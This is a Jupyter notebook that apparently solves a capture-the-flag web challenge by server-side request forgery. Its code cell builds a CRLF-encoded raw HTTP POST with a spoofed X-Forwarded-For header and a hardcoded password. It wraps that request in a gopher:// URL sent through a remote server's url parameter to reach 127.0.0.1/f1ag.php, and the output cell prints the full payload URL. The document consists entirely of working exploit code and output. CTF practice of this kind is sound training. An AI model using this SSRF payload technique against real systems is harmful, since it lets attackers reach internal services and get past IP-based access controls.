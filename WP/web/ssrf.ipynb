{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://120.46.203.71:50698/?url=gopher://127.0.0.1/f1ag.php_POST%2520/f1ag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Chrome/92.0.4515.107%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AX-Forwarded-For%253A%2520authorized.local%250D%250AContent-Length%253A%252027%250D%250A%250D%250Apassw0rd%253DThis_eAsy_passwOrd\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'听说访问127.0.0.1/f1ag.php就能获得flag哦\\n'"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from urllib.parse import quote\n",
    "data = \"passw0rd=This_eAsy_passwOrd\"\n",
    "package = \"\"\"POST /f1ag.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "Cache-Control: max-age=0\n",
    "Upgrade-Insecure-Requests: 1\n",
    "User-Agent: Chrome/92.0.4515.107 Safari/537.36\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n",
    "Accept-Language: zh-CN,zh;q=0.9\n",
    "Connection: close\n",
    "Content-Type: application/x-www-form-urlencoded\n",
    "X-Forwarded-For: authorized.local\n",
    "Content-Length: {}\n",
    "\n",
    "\"\"\".format(len(data))+data\n",
    "\n",
    "package=quote(package).replace('%0A','%0D%0A')\n",
    "\n",
    "url = \"http://120.46.203.71:50698/?url=gopher://127.0.0.1/f1ag.php_\"+quote(package) # 作为url参数使用需要再加一层url编码\n",
    "\n",
    "import requests \n",
    "print(url)\n",
    "requests.get(url).text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.8"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
